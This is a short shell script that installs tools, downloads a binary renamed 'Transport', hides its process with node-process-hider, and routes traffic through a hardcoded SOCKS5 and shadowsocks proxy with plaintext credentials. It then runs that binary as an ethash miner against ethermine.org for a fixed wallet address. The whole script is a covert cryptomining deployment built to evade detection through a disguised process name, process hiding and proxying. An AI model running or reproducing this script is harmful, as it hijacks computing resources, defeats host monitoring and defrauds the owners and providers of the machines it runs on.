apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 192.186.186.197:6239
socks5_username = ubuntu2004
socks5_password = LijayaAnli1188
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
chmod +x Transport

apt -y install shadowsocks-libev rng-tools

ss-local -s 192.186.186.197 -p 8388 -l 9999 -k LijayaAnli1188 -m chacha20-ietf-poly1305 -v &

ph add Transport

LD_PRELOAD="" ./Transport -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb -p x -w $(echo $(shuf -i 1-99999 -n 1)-WEWEK) --no-sni --proxy 192.186.186.197:6239
